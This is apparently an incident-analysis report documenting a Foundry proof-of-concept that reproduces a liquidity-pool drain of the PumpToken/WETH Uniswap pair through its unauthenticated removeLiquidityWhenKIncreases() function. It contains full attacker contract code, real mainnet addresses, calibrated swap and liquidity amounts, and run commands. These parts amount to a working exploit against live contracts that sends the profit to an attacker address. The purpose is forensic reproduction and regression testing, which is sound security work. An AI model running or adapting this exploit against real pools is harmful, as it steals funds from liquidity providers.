## Overview & Context

This proof-of-concept (PoC) reproduces the PumpToken `removeLiquidityWhenKIncreases` LP-drain vulnerability on an Ethereum mainnet fork. An unprivileged adversary uses large WETH liquidity to manipulate the PumpToken/WETH UniswapV2 pair, calls a publicly exposed `removeLiquidityWhenKIncreases()` function on PumpToken to burn PumpToken from the pool, and then removes liquidity and swaps back to WETH to realize an ETH profit. The behavior matches the incident analyzed in `root_cause_report.md` and `root_cause.json`, where a 30,000 WETH flashLoan-backed transaction drained value from the PumpToken/WETH LP.

The PoC is implemented as a Foundry test suite under `forge_poc/test/Exploit.sol` and is validated by running on a fork of Ethereum mainnet at block 21,529,887 with the real PumpToken, WETH9, UniswapV2 pair, and UniswapV2Router02 contracts.

**Command to run the PoC:**

```bash
cd /home/ziyue/TxRayExperiment/incident-202512270825/forge_poc
RPC_URL="<mainnet_rpc_url>" forge test --via-ir -vvvvv
```

In the validator run, `RPC_URL` is constructed from the QuickNode configuration in the experiment’s `.env` and `artifacts/poc/rpc/chainid_rpc_map.json` for chainid 1 (Ethereum mainnet).

## PoC Architecture & Key Contracts

The PoC is centered around a Foundry test contract and a helper attacker contract:

- `PumpTokenExploitTest` (Foundry test)
  - Drives the main exploit scenario.
  - Creates an Ethereum mainnet fork at block 21,529,887.
  - Binds to real on-chain PumpToken, WETH9, the PumpToken/WETH UniswapV2 pair, and UniswapV2Router02.
  - Deploys a local adversary helper contract and seeds it with WETH to simulate the original 30,000 WETH flashLoan.
  - Implements oracle pre-checks and all hard/soft constraints.

- `PumpFlashLoanAttacker` (helper adversary contract)
  - Holds WETH capital, performs swaps and liquidity operations, calls the vulnerable PumpToken function, and realizes profit in ETH on behalf of the attacker EOA.

### Key Helper Contract Logic

The core adversary behavior is encoded in `PumpFlashLoanAttacker::executeAttack`:

```solidity
function executeAttack() external {
    require(msg.sender == owner, "only owner");

    uint256 startingWeth = weth.balanceOf(address(this));
    require(startingWeth >= CAPITAL_WETH, "insufficient initial WETH capital");

    weth.approve(address(router), type(uint256).max);
    pumpToken.approve(address(router), type(uint256).max);

    uint256 wethToSwap = 11_526_249_223_479_392_795_400;
    address[] memory path = new address[](2);
    path[0] = address(weth);
    path[1] = address(pumpToken);
    router.swapExactTokensForTokens(wethToSwap, 0, path, address(this), block.timestamp);

    uint256 pumpForLiq = 6_090_844_737_683_950_823_905_816;
    uint256 wethForLiq = 11_526_249_223_479_392_795_400;
    router.addLiquidity(address(pumpToken), address(weth), pumpForLiq, wethForLiq, 0, 0, address(this), block.timestamp);

    pumpToken.removeLiquidityWhenKIncreases();

    uint256 lpBalance = pair.balanceOf(address(this));
    pair.approve(address(router), lpBalance);
    router.removeLiquidity(address(pumpToken), address(weth), lpBalance, 0, 0, address(this), block.timestamp);

    uint256 pumpBalance = pumpToken.balanceOf(address(this));
    address[] memory pathBack = new address[](2);
    pathBack[0] = address(pumpToken);
    pathBack[1] = address(weth);
    router.swapExactTokensForTokens(pumpBalance, 0, pathBack, address(this), block.timestamp);

    uint256 profitWeth = weth.balanceOf(address(this));
    if (profitWeth > 0) {
        weth.withdraw(profitWeth);
        (bool ok, ) = owner.call{value: address(this).balance}("");
        require(ok, "ETH transfer failed");
    }
}
```

*Snippet (helper contract from Exploit.sol): The adversary helper swaps WETH into PumpToken, adds PumpToken/WETH liquidity, calls the vulnerable `removeLiquidityWhenKIncreases`, removes liquidity, swaps PumpToken back to WETH, unwraps to ETH, and forwards ETH profit to the attacker EOA.*

The numeric parameters (`CAPITAL_WETH`, `wethToSwap`, `pumpForLiq`, `wethForLiq`) are calibrated from the on-chain exploit trace to push the PumpToken/WETH pair’s reserves to levels that exceed the `INITIAL_UNISWAP_K` threshold, thereby triggering the vulnerable branch.

### Vulnerable PumpToken Logic

The root cause analysis identifies `PumpToken::removeLiquidityWhenKIncreases()` as the vulnerable function:

```solidity
function removeLiquidityWhenKIncreases() public {
    (uint256 tokenReserve, uint256 wethReserve) = getReservesSorted();
    uint256 currentK = tokenReserve * wethReserve;

    if (currentK > (105 * INITIAL_UNISWAP_K / 100)) {
        IUniswapV2Pair pair = IUniswapV2Pair(uniswapV2Pair);

        _balances[uniswapV2Pair] -= tokenReserve * (currentK - INITIAL_UNISWAP_K) / currentK;
        pair.sync();
    }
}
```

*Snippet (vulnerable PumpToken code from incident source): Public, unauthenticated logic that reduces the PumpToken balance of the PumpToken/WETH UniswapV2 pair whenever the product of reserves `K` exceeds a fixed threshold, without compensating LPs.*

This function allows anyone who can temporarily increase `K` (e.g., via flashLoan-backed liquidity provision and trading) to shrink the PumpToken balance at the pair, altering the pool’s composition in a way that benefits whoever later removes liquidity.

## Adversary Execution Flow

The PoC implements an end-to-end ACT sequence that mirrors the incident but uses fresh attacker identities and a locally deployed helper contract.

### Funding and Environment Setup

In `PumpTokenExploitTest.setUp`:

- The test reads `RPC_URL` from the environment and creates a mainnet fork at block 21,529,887 using `vm.createFork`.
- It defines the following mainnet addresses:
  - `PUMP_TOKEN = 0x05641E33Fd15BAf819729dF55500b07b82Eb8E89`
  - `WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2`
  - `UNISWAP_PAIR = 0xb292678438245Ec863F9FEa64AFfcEA887144240`
  - `UNISWAP_ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D`
- A fresh attacker EOA is created via `makeAddr("attacker")` and funded with 1 ETH for deployment and gas using `vm.deal`.
- The test binds interfaces to the real PumpToken, WETH9, Uniswap pair, and router contracts on the fork.
- Labels are applied via `vm.label` for readability in traces.
- A `PumpFlashLoanAttacker` contract is deployed from the attacker EOA and labeled for clarity.
- To simulate the original 30,000 WETH flashLoan, the test uses `deal(WETH, address(attackerContract), 30_000 ether)` to credit the helper contract with WETH on the fork.

*This setup ensures the PoC runs against real mainnet state without using the actual attacker addresses or helper contract from the incident.*

### Deployment and Configuration

The attacker helper contract stores immutable references to WETH, PumpToken, the Uniswap router, and the PumpToken/WETH pair. Its constructor simply records these contracts and the designated owner (the attacker EOA). No privileged roles or protocol changes are introduced; the helper exclusively uses public entrypoints on existing protocol contracts.

### Exploit Steps

Inside `PumpTokenExploitTest.testExploit`, the high-level flow is:

```solidity
function testExploit() public {
    uint256 pumpBefore = pumpToken.balanceOf(UNISWAP_PAIR);
    uint256 wethBefore = weth.balanceOf(UNISWAP_PAIR);
    uint256 attackerEthBefore = attacker.balance;

    reproducerAttack();

    uint256 pumpAfter = pumpToken.balanceOf(UNISWAP_PAIR);
    uint256 wethAfter = weth.balanceOf(UNISWAP_PAIR);
    uint256 attackerEthAfter = attacker.balance;

    // Oracle checks (HC1–HC3, SC1–SC3)...
}
```

*Snippet (main test flow from Exploit.sol): The test snapshots pre-exploit balances, runs the exploit through `reproducerAttack`, and then evaluates balance changes against the defined oracles.*

The inner `reproducerAttack()` function pranks as the attacker and calls `attackerContract.executeAttack()`, which performs the detailed exploit steps:

1. **Swap WETH to PumpToken**
   - The helper approves the Uniswap router to spend WETH and PumpToken.
   - It swaps a calibrated amount of WETH into PumpToken along the route WETH → PumpToken via the PumpToken/WETH pair.

2. **Add PumpToken/WETH Liquidity**
   - Using the PumpToken and WETH balances obtained, the helper adds liquidity to the PumpToken/WETH UniswapV2 pair.
   - Amounts are chosen based on the on-chain trace so that the pair’s reserves are pushed to tokenReserve and wethReserve values that increase `K` beyond `1.05 * INITIAL_UNISWAP_K`.

3. **Call the Vulnerable Function**
   - With the inflated reserves in place, the helper calls `PumpToken.removeLiquidityWhenKIncreases()`.
   - This burns (reduces) PumpToken from the pair’s balance according to the K-based formula and syncs the pair, effectively transferring value from LPs to whoever later removes liquidity.

4. **Remove Liquidity**
   - The helper approves the router to spend its LP tokens and removes all PumpToken/WETH liquidity it just added.
   - Because PumpToken was burned from the pair, the WETH share the helper can withdraw is relatively more valuable.

5. **Swap PumpToken Back to WETH**
   - The helper swaps its remaining PumpToken balance back into WETH via the same pair, further depleting WETH reserves on the PumpToken/WETH LP.

6. **Realize Profit in ETH**
   - Any remaining WETH is unwrapped to ETH via `weth.withdraw`.
   - ETH is transferred to the attacker EOA, finalizing the adversary’s profit.

### Profit Realization and Post-State

The Foundry trace from the validator run (`artifacts/poc/poc_validator/forge-test.log`) shows:

- WETH transfers into the PumpToken/WETH pair and back out to the helper.
- A call to `PumpToken.removeLiquidityWhenKIncreases()` on the real PumpToken contract.
- A net decrease in the PumpToken balance of the pair.
- WETH reserves of the pair decreasing as liquidity is removed and PumpToken is swapped back to WETH.
- An increase in the attacker EOA’s ETH balance after WETH is unwrapped and forwarded.

These observations match the qualitative behavior and quantitative trends described in the root cause artifacts (notably `balance_diff.json` and `debug_trace_prestate_diff.json`).

## Oracle Definitions and Checks

The oracle specification at `artifacts/poc/oracle_generator/oracle_definition.json` defines variables, pre-checks, and constraints that the PoC must satisfy.

### Variables

Key variables include:

- `pumpToken` – PumpToken ERC20 at `0x05641e33fd15baf819729df55500b07b82eb8e89`.
- `weth` – WETH9 at `0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2`.
- `eth_profit_asset` – Abstracts the profit asset, expected to be ETH.
- `uniswapPair` – PumpToken/WETH UniswapV2 pair at `0xb292678438245Ec863F9FEa64AFfcEA887144240`.
- `uniswapRouter` – UniswapV2Router02 at `0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D`.
- `balancerVault` – Balancer Vault at `0xBA12222222228d8Ba445958a75a0704d566BF2C8` (used in the original incident but not directly invoked in the PoC, which simulates the flashLoan via WETH funding).

### Pre-Checks

The oracle pre-checks are all implemented in `setUp()`:

1. **Pair deployment check**
   - Asserts that the PumpToken/WETH pair at `UNISWAP_PAIR` has deployed code, ensuring the fork matches mainnet.

2. **PumpToken deployment check**
   - Asserts that the PumpToken contract at `PUMP_TOKEN` has deployed code.

3. **Pair composition check**
   - Reads `token0` and `token1` from the pair and asserts that they are PumpToken and WETH in either order, guaranteeing the correct AMM pool is targeted.

4. **Non-zero reserves check**
   - Verifies that the pair holds non-zero balances of PumpToken and WETH before the exploit, matching the pre-state described in the root cause artifacts.

### Hard Constraints (HC)

The PoC implements all hard constraints:

- **HC1 – PumpToken balance in pair decreases**
  - The test snapshots `pumpBefore` and `pumpAfter` and asserts `assertLt(pumpAfter, pumpBefore, ...)`, ensuring PumpToken is removed from the pair during the exploit.

- **HC2 – Vulnerable call is public and succeeds**
  - The vulnerable function `removeLiquidityWhenKIncreases()` is invoked inside `reproducerAttack()` from an unprivileged attacker contract. Any revert in this call would cause the test to fail, implicitly enforcing that an unprivileged adversary can successfully trigger the function on the forked mainnet state.

- **HC3 – Profit asset is ETH**
  - The test encodes `eth_profit_asset_symbol = "ETH"` and asserts equality, reflecting that profit is ultimately realized in ETH via WETH unwrapping.

### Soft Constraints (SC)

The PoC also satisfies the soft (semantic) constraints:

- **SC1 – Attacker strictly profits in ETH**
  - `attackerEthBefore` and `attackerEthAfter` are compared using `assertGt(attackerEthAfter, attackerEthBefore, ...)`, guaranteeing positive ETH profit for the attacker EOA under the exploit predicate.

- **SC2 – Uniswap pair loses WETH reserves**
  - `wethBefore` and `wethAfter` are measured at the pair and `assertLt(wethAfter, wethBefore, ...)` is enforced, showing WETH is drained from the LP.

- **SC3 – Large PumpToken removal from pair**
  - The test computes `removed = pumpBefore - pumpAfter` and asserts `removed > 1e21`, ensuring a substantial (economically meaningful) amount of PumpToken is burned/removed from the pair, in line with the ~1.31e22 PumpToken delta observed in the incident.

Together, these checks encode the same invariant drift and profit conditions as the oracle definition.

## Validation Result and Robustness

The validator re-ran the PoC with full tracing:

- Command (from validator root):

```bash
cd /home/ziyue/TxRayExperiment/incident-202512270825/forge_poc
RPC_URL="<constructed_mainnet_rpc_url>" forge test --via-ir -vvvvv \
  > /home/ziyue/TxRayExperiment/incident-202512270825/artifacts/poc/poc_validator/forge-test.log 2>&1
```

The run produced:

- 1 test executed: `test/Exploit.sol:PumpTokenExploitTest`
- `[PASS] testExploit()`
- Detailed traces confirming interactions with real mainnet PumpToken, WETH9, the PumpToken/WETH UniswapV2 pair, and UniswapV2Router02 on a fork at block 21,529,887.

The machine-readable validation result is stored at:

- `artifacts/poc/poc_validator/poc_validated_result.json`

Key fields from that file:

- `overall_status = "Pass"`
- `poc_correctness_checks.passes_validation_oracles.passed = true`
- All `poc_quality_checks` sub-entries are marked `passed = true`.
- `artifacts.validator_test_log_path` points to the validator’s Forge log used for this assessment.

The validator confirms that the PoC:

- Runs successfully on a mainnet fork without reverts.
- Satisfies all defined hard and soft oracles.
- Is human-readable and clearly labeled.
- Contains no undisclosed attacker-side identities or artifacts.
- Models an end-to-end exploit flow that closely matches the root cause analysis.

## Linking PoC Behavior to Root Cause

The PoC behavior is tightly aligned with the ACT framing and root cause analysis.

### Exploit Predicate and Profit

The root cause JSON defines an exploit predicate based on ETH-denominated profit:

- The adversary EOA’s ETH-equivalent balance increases by roughly 12.31 ETH.
- WETH9 loses approximately 12.34 ETH-equivalent, with residual ETH also accruing to a secondary address.

In the PoC:

- The attacker helper starts with substantial WETH capital (simulating the 30,000 WETH flashLoan).
- After the swap–liquidity–vulnerable-call–liquidity-removal–swap sequence, the attacker EOA’s ETH balance is strictly higher, satisfying SC1 and demonstrating a positive ETH profit in the same direction as the incident.

### Vulnerable Logic and State Changes

The ACT root cause details that:

- `removeLiquidityWhenKIncreases()` is public and unauthenticated.
- It computes `currentK = tokenReserve * wethReserve` from UniswapV2 pair reserves.
- When `currentK > 1.05 * INITIAL_UNISWAP_K`, it decreases PumpToken’s balance for the pair and syncs the reserves, effectively gifting value to LP token holders who later remove liquidity.
- In the incident, this results in a large PumpToken burn from the pair and a drain of WETH reserves when the attacker removes liquidity and swaps.

The PoC directly exercises this path:

- By calling `removeLiquidityWhenKIncreases()` from a fresh helper contract on the real PumpToken/WETH pair.
- By calibrating liquidity operations so that `K` crosses the required threshold.
- By confirming that the pair’s PumpToken balance decreases and WETH reserves drop, as enforced by HC1 and SC2.

### ACT Roles and Sequence

The ACT framework identifies:

- **Adversary actions (sequence b)** – A single adversary-crafted transaction that deploys a helper, takes a flashLoan, manipulates reserves, calls the vulnerable function, removes liquidity, swaps, and realizes profit.
- **Victim state** – LPs in the PumpToken/WETH pool whose WETH reserves are drained.

In the PoC:

- The attacker EOA and `PumpFlashLoanAttacker` stand in for the original adversary EOA and helper, but are fresh addresses created within the test.
- The mainnet PumpToken, WETH9, Uniswap pair, and router are used as-is from the fork.
- The execution sequence implemented in `testExploit` mirrors the incident’s stages and achieves the same qualitative outcome: a profitable trade sequence for the adversary at the expense of LPs.

### Conclusion

Based on the validator’s independent execution and oracle-based assessment:

- The Forge PoC is **correct** with respect to the oracle specification and root cause analysis.
- The PoC is **high quality**, being self-contained, well-labeled, mainnet-forked, and free of attacker-side artifacts.
- The PoC convincingly demonstrates the PumpToken `removeLiquidityWhenKIncreases` LP-drain exploit and can be used as a reliable regression test and reference implementation for this incident.

